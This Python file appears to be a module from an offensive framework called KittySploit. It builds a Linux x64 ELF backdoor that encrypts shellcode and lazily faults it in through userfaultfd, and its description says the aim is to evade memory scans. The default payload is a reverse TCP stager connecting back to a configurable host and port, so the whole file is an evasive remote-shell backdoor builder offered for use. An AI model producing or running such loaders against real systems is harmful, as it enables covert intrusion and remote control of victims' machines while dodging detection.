#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
userfaultfd delayed-reveal shellcode loader (Linux x64).

Maps shellcode with userfaultfd, drops pages from memory, then faults them back
in page-by-page via a handler thread before execution.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.linux_backdoor_helpers import build_encrypted_elf_backdoor
from lib.compile.userfaultfd_loader import UserfaultfdBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Linux userfaultfd Evasion Loader",
        "description": (
            "Generate a Linux x64 ELF that uses userfaultfd to lazily resolve "
            "encrypted shellcode pages at access time, evading simple memory scans."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://man7.org/linux/man-pages/man2/userfaultfd.2.html",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(3000, "Sleep milliseconds before executing shellcode", False)
    output_name = OptString("userfaultfd_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = UserfaultfdBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_elf_backdoor(
            self,
            builder,
            output_name="userfaultfd_evasion",
            save_source_name="userfaultfd_evasion.c",
            extra_link_args=["-lpthread"],
        )
        if ok:
            print_info(f"Cipher: {option_value(self, 'cipher')} | Sleep: {option_value(self, 'sleep')} ms")
        return ok
